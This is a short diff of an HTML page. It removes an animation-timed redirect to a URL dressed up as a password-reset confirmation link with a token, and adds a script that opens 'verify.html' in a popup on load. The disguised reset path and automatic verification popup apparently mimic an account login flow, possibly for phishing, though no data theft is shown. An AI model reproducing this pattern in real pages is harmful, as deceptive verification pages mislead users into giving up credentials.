@@ -109,16 +109,19 @@
     
     </div>
 
-    <script>
-        // Simulate the opening animation
-        setTimeout(function() {
-            document.getElementById('container').style.opacity = '0';
-            setTimeout(function() {
-                document.getElementById('container').style.display = 'none';
-                window.location.href = 'password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Verify.html';
-            }, 100); // Adjust the delay as needed
-        }, 1600); // Adjust the initial delay as needed
-    </script>
+    <!-- In your index.html script that opens verify.html -->
+<script>
+    function openVerifyPage() {
+        // Open verify.html and store a reference to the window
+        const verifyWindow = window.open('verify.html', '_blank', 'height=600,width=800');
+
+        // Store the reference to the opened window in a global variable
+        window.verifyWindow = verifyWindow;
+    }
+
+    // Call this function to open verify.html
+    openVerifyPage();
+</script>
 </body>
 </html>
 
